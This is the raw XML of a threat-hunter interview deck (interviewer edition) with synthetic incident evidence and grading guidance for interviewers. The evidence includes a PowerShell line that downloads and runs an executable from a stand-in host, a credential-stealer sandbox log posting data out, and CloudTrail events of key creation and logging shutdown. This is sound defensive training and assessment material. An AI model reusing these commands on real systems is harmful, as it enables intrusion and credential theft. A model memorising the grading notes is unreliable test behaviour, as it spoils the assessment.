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8e9f7764d24560" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="/docProps/app.xml" Id="Rc46834f427284e6d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="/ppt/presentation.xml" Id="R93148e4b7e0849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c795e7b28c4471"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="R7c5ff5e7c9804222"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="256" r:id="R2b6db3fa9d6c4ff3"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="257" r:id="R54d5c9df463947df"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="258" r:id="R423582c3b0974130"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="259" r:id="Rb6b5d77fc0d94a2d"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="260" r:id="R042319be73a041d2"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="261" r:id="Rb1a77fda42204a9f"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="262" r:id="R6df2595a557e4b25"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="263" r:id="R0f089bc5504f4894"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="264" r:id="Rf26d82a7cc774937"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="265" r:id="R996659596b2a4b32"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="266" r:id="R594d4e933e854ec0"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="267" r:id="R1f5e928e56a344a4"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="268" r:id="R569c4f61e4b74756"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="269" r:id="R6adefb32a5794bef"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="270" r:id="R96db7b8b96f84b82"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="271" r:id="R26e480274deb46a4"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="272" r:id="Ra4486ebab841432f"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="273" r:id="R62d6bd71caba4555"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="274" r:id="R7b2422eba34042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c3da8434904a16" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="/ppt/slideMasters/slideMaster1.xml" Id="R23c795e7b28c4471" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R7c5ff5e7c9804222" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="/ppt/presProps.xml" Id="Rcc720b4683564c81" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="/ppt/tableStyles.xml" Id="R88e41247fcc54ddb" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide1.xml" Id="R2b6db3fa9d6c4ff3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide2.xml" Id="R54d5c9df463947df" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide3.xml" Id="R423582c3b0974130" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide4.xml" Id="Rb6b5d77fc0d94a2d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide5.xml" Id="R042319be73a041d2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide6.xml" Id="Rb1a77fda42204a9f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide7.xml" Id="R6df2595a557e4b25" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide8.xml" Id="R0f089bc5504f4894" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide9.xml" Id="Rf26d82a7cc774937" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide10.xml" Id="R996659596b2a4b32" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide11.xml" Id="R594d4e933e854ec0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide12.xml" Id="R1f5e928e56a344a4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide13.xml" Id="R569c4f61e4b74756" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide14.xml" Id="R6adefb32a5794bef" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide15.xml" Id="R96db7b8b96f84b82" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide16.xml" Id="R26e480274deb46a4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide17.xml" Id="Ra4486ebab841432f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide18.xml" Id="R62d6bd71caba4555" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide19.xml" Id="R7b2422eba34042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7882660f9447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3f3acd7a64446c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Re433ee9692dd4b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13f73ca0a249ad" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R2f9d48510c7a43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ded90157a44dbf" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R272f95bf318648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6c4bd680bc4bf7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R09c5790578c548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24271e1f1a4887" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R4b6bb755749946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061f91d09a4db2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R5c0be43b11bf4f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267d8f53974f2e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R21eb68c700914b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e9bdae674944ec" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R6cc0b8a26d774b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d7f096584646c5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R08a3c420fa734e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84cd84a94e4574" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R622e94c3ac4d480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513b50274f48ec" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc591f1903af542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c840a0f24a4dc4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R5a7ccbce48fe43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b50727785d4ac1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc36878d6131f4f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5d054a1c0d4be4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R7cc2f4b232ce46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f181908c6b4bb9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf8a1cc21d7794b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3e2a363ac14696" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R151fe082401f4d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23dec3a17714628" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R8a81b74c8bf34ff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e98044751b49ca" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R75849a615e9f498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2344d0c1ae747ef" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rb89c3f99097b45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scenarios. Names, domains, IP addresses, logs, and architectures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selected scenarios one at a time. Give the candidate time to reason aloud.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selected raw fields. Field semantics reference:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/defender-endpoint/attack-surface-reduction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selected raw fields. Field semantics reference:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4624</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes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selected raw fields. Field semantics reference:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/windows/win32/debug/pe-format</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://attack.mitre.org/techniques/T1555/003/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys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selected raw fields. Field semantics reference:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/awscloudtrail/latest/APIReference/API_StopLogging.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html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code excerpts and domains. The URL assignments are contextual values, not lines from the script. No execution evidence is supplied.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.python.org/3/library/pathlib.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.python.org/3/library/subprocess.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.python-requests.org/en/latest/user/quickstart/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architecture. AWS security group rules can reference a specific source security group; VPC Flow Logs provide network-flow visibility.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/en_en/vpc/latest/userguide/security-group-rules.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/vpc/latest/userguide/flow-logs.html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Synthetic architecture. CISA recommends separate privileged identities, PAM, MFA, and auditing for admin access.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.cisa.gov/sites/default/files/2023-12/ESF%20IDENTITY%20AND%20ACCESS%20MANAGEMENT%20RECOMMENDED%20BEST%20PRACTICES%20FOR%20ADMINISTRATORS%20PP-23-0248_508C.pdf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a detection analytic, an immediate action, and a preventive control. Reward uncertainty where the logs are insufficient.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References:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/defender-endpoint/attack-surface-reduction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a detection analytic, an immediate action, and a preventive control. Reward uncertainty where the logs are insufficient.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References:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4624</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes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a detection analytic, an immediate action, and a preventive control. Reward uncertainty where the logs are insufficient.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References:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/windows/win32/debug/pe-format</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://attack.mitre.org/techniques/T1555/003/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys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for a detection analytic, an immediate action, and a preventive control. Reward uncertainty where the logs are insufficient.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References:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/awscloudtrail/latest/APIReference/API_StopLogging.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html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Strong candidates separate code capability from confirmed execution and discuss evidence for data transfer. Python subprocess warns about shell=True with untrusted input.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.python.org/3/library/subprocess.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.python-requests.org/en/latest/user/quickstart/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a well-reasoned alternative that identifies the overbroad VPC-wide database rule. Do not require a literal hardware firewall; a tight security group is the relevant cloud control.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/en_en/vpc/latest/userguide/security-group-rules.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://docs.aws.amazon.com/vpc/latest/userguide/flow-logs.html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Prioritize the gap the candidate can justify. Strong answers address attribution, MFA, privilege separation, network scope, and auditability.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.cisa.gov/sites/default/files/2023-12/ESF%20IDENTITY%20AND%20ACCESS%20MANAGEMENT%20RECOMMENDED%20BEST%20PRACTICES%20FOR%20ADMINISTRATORS%20PP-23-0248_508C.pdf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9d2946afe4d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5d9cd236f94f3e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="/ppt/slideLayouts/slideLayout1.xml" Id="Ra25048fd953640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5048fd953640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dab06ab364400" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide1.xml" Id="Rcabf9f4fbd304b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1d3179b8e484f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide2.xml" Id="Raa9a613e96e54b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f2f8f0fb24217" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide3.xml" Id="Rb43d23b8b38a4c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459701b0d4e00" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide4.xml" Id="Rb87a62aef19544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7dd1f4a214ffd" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide5.xml" Id="R4324cfe452b140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1c568af40415e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide6.xml" Id="R80ba54dc45754a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569778756463a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide7.xml" Id="R9a78b166f03148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f241f4dac4638" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide8.xml" Id="R92682368b7044e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cd974ed3b4de2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide9.xml" Id="R3bad95ba9ade49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5966075dc4364" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide10.xml" Id="Rd397bb8fc05d4a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eb03889614751" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide11.xml" Id="R2f9ca679cdc847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1972b280a4130" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide12.xml" Id="R10729a0d28bb4c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d15207c41437e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide13.xml" Id="Rfbcacc9faf8e4c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ad4f6ed1d4dea" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide14.xml" Id="Rdc210707e1ce44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bdb0ca88749fa" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide15.xml" Id="Re8756b721baf4f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40a9190a04d8b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide16.xml" Id="R93abbfa940cb42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ee84f0ccf4344" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide17.xml" Id="Rbfcc00823b02498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0e315c95747b0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide18.xml" Id="R6d7d072f60d543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4b2b1b3a445ff" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide19.xml" Id="Re0bb232a79b94a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51260-E24E-4AF9-9021-424D5C64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7F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7F2"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Senior threat hunter interview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5302A-3829-4C68-A6A2-A436EA90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FD7D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D7D8"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Four log cases, one Python review, two architecture reviews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350DA-A896-483F-9FAA-1AD60058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9C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AB9C0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Interviewer edition</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2058830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FDE72-3E33-4E68-9933-0112DCCA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Candidate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298D8-5AEA-49AE-9041-04C1C4B5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For each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73FB6-D3B4-4428-94D7-13CD17EA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0668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Explain what the evidence shows and what remains uncertain.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Describe how you would detect or confirm related activity.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Prioritize immediate mitigation, then propose a preventive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1CBF7-F728-49F6-B2AE-E90115C1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The questions are on each evidence slide. Ask for telemetry or context you need.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3644929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EE729-70A4-4821-AC01-E5C9E932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01  /  LT-184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A97B4-0344-4309-86D4-F2FA783C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POWERSHELL + SYSMON  ·  09:14 UTC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8CF5A-7E7D-4D72-A26A-95B1A61B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58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2026-09-29T09:14:02Z LT-184 Sysmon/1 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe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ParentImage=...\Office16\WINWORD.EXE User=CORP\ada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CommandLine=powershell.exe -NoProfile -WindowStyle Hidden -File C:\Users\ada\AppData\Local\Temp\u.ps1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2026-09-29T09:14:03Z LT-184 PowerShell/4104 User=CORP\ada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ScriptBlockText=$p=Join-Path $env:TEMP 's.exe'; Invoke-WebRequest 'https://cdn-docs.example/s' -OutFile $p; &amp; $p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2026-09-29T09:14:04Z LT-184 Sysmon/3 Image=...\powershell.exe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DestinationHostname=cdn-docs.example DestinationPort=443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2026-09-29T09:14:05Z LT-184 Sysmon/11 Image=...\powershell.exe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TargetFilename=C:\Users\ada\AppData\Local\Temp\s.exe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2026-09-29T09:14:06Z LT-184 Sysmon/1 Image=...\Temp\s.exe ParentImage=...\powershell.exe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1C504-3156-4E49-A331-AC3C5663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62650-DC69-44C8-BDC5-A64E22DC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What execution chain does this evidence support, and what remains unproven?</a:t>
            </a:r>
          </a:p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How would you hunt for related activity, contain the host, and prevent recurrence?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1544250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57529-D48A-4207-94E1-40249D47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02  /  WS-107 to FS-02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AA86F-4498-4716-8F00-453DDA00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POWERSHELL REMOTING + WINDOWS EVENTS  ·  02:11 UTC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F58A7-0211-4E92-B4DA-6F1849E6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58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2026-09-29T02:11:00Z WS-107 PowerShell/4104 User=CORP\svc_patch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ScriptBlockText=Invoke-Command -ComputerName FS-02 -FilePath C:\Tools\health.ps1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2026-09-29T02:11:01Z WS-107 Sysmon/3 Image=...\powershell.exe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DestinationIp=10.24.5.12 DestinationPort=5985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2026-09-29T02:11:02Z FS-02 Security/4624 TargetUser=CORP\svc_patch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LogonType=3 IpAddress=10.24.18.77 TargetLogonId=0x7e4b1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2026-09-29T02:11:04Z FS-02 PowerShell/4104 User=CORP\svc_patch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ScriptBlockText=Register-ScheduledTask -TaskName TelemetryRefresh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Action=Execute:C:\ProgramData\cache\wmcache.exe Trigger=AtLogOn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2026-09-29T02:11:05Z FS-02 TaskScheduler/106 TaskName=TelemetryRefresh User=CORP\svc_patch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ED314-6EBD-4090-BE84-C796806F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CB537-52C0-4AC4-ABE7-3788C5F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Is this approved administration or persistence? Which evidence would decide?</a:t>
            </a:r>
          </a:p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What would you detect, mitigate immediately, and change in the access design?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1509304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A79D3-3970-4687-A2E7-20264D7D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03  /  invoice_viewer.exe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053CF-C66A-488C-A71B-FA8A1BDA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PE TRIAGE + SANDBOX OBSERVATIONS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0BAA5-3E3A-4152-ADC8-85820D15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58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sample.path=C:\Users\nina\Downloads\invoice_viewer.exe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sample.sha256=a93f5c0b7e42d16f56c243680ed145ad14261814f6835c256a762f2dd907c9b1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sample.authenticode=Unsigned sample.size=381952 bytes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PE.imports=CRYPT32!CryptUnprotectData,WINHTTP!WinHttpSendRequest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strings[0]=Chrome\User Data\Default\Login Data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strings[1]=Software\Microsoft\Windows\CurrentVersion\Run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2026-09-29T11:06:02Z sandbox/file_read path=...\Chrome\User Data\Default\Login Data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2026-09-29T11:06:04Z sandbox/registry_set key=HKCU\...\CurrentVersion\Run\DocSync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value=C:\Users\nina\Downloads\invoice_viewer.exe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2026-09-29T11:06:08Z sandbox/http method=POST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url=https://telemetry-billing.example/api/collect bytes_sent=18432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20D28-0EEB-42A3-9DD5-9E534EC6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24EBD-983C-473F-A13B-5DE9A2D9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What do the static and sandbox findings show? How would you analyze the sample safely?</a:t>
            </a:r>
          </a:p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How would you find affected hosts, assess exposure, and prevent another run?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8918874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F00CA-4257-4585-A1E1-776998B3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04  /  AWS account 123456789012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4CA63-FDFC-4A6F-8DCE-0E994F15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CLOUDTRAIL MANAGEMENT EVENTS  ·  15:44–15:46 UTC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C674B-A4A4-4FA1-B8C0-D257C4C5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585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2026-09-29T15:44:02Z CloudTrail eventName=DescribeTrails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actor=assumed-role/ci-deploy/runner-7 sourceIPAddress=198.51.100.92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2026-09-29T15:44:38Z CloudTrail eventName=CreateAccessKey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actor=assumed-role/ci-deploy/runner-7 requestParameters.userName=breakglass-admin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responseElements.accessKey.accessKeyId=AKIA7EXAMPLE9G2K4Q6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2026-09-29T15:46:07Z CloudTrail eventName=StopLogging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actor=assumed-role/ci-deploy/runner-7 requestParameters.name=org-audit</a:t>
            </a:r>
          </a:p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sourceIPAddress=198.51.100.92 awsRegion=us-east-1 errorCode=null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55ACA-0308-47C8-B908-D59BD6CB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3ACA7-9D6A-4A27-8592-349BFDF5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What do these CloudTrail events suggest, and what would you verify first?</a:t>
            </a:r>
          </a:p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How would you detect similar activity, restore visibility, and limit the CI role?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1654999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0518F-5821-42F0-B103-176918DE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05  /  Python script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23AA8-AC68-43BE-A9C9-5B64191D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8585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TWO EXCERPTS FROM A HOST-HEALTH PACKAGE  /  EXECUTION STATUS UNKNOWN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46F07-BF4C-4061-8937-5EA0915B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A  /  collect.py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22559-183F-45B2-9DD8-4B875F11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525"/>
